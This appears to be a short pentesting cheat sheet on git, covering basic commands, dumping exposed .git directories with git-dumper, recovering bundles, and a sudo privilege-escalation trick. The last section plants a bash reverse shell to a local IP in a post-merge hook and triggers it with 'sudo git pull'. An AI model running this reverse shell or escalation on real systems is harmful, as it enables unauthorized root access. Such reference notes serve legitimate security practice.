---
title: "git"
date: 2024-6-28
tags: ["git", "git-dumper", "sudo", "privesc"]
---

### Basic Commands

<div>

```console
# Show status
git status
```

```console
# Reset the current branch to a previous commit
git reset --hard
```

```console
# Show information about files
git ls-files --stage
```

```console
# Show current branch
git branch
```

```console
# Show commits
git log <BRANCH_NAME> --oneline
```

```console
# Show diff, a and b are commit hash
# a is the older commit
git diff <A_COMMIT_HASH> <B_COMMIT_HASH>
```

```console
# Show commit
git show <COMMIT_HASH>
```

</div>

<br>

---

### Git Tools

{{< tab set1 tab1 active >}}git-dumper{{< /tab >}}
{{< tab set1 tab2 >}}git-bundle{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
git-dumper <TARGET>/.git result/
```

</div>

<small>*Ref: [Download git-dumper](https://github.com/arthaud/git-dumper)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```console
# List all bundles
find . -type f -exec file {} \;
```

```console
# Get bundle
git clone -b master @hashed/ab/cd/<HASH>.bundle
```

</div>

{{< /tabcontent >}}

<br>

---

### SUDO

<div>

```console
# Copy target project
cp -r /var/www/html/project .
```

```console
# Create a malicious post-merge
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1' > ./project/.git/hooks/post-merge
```

```console
# Run
sudo /usr/bin/git pull
```

</div>

<small>*Note: Make changes to the project to make the pull work*</small>

<br>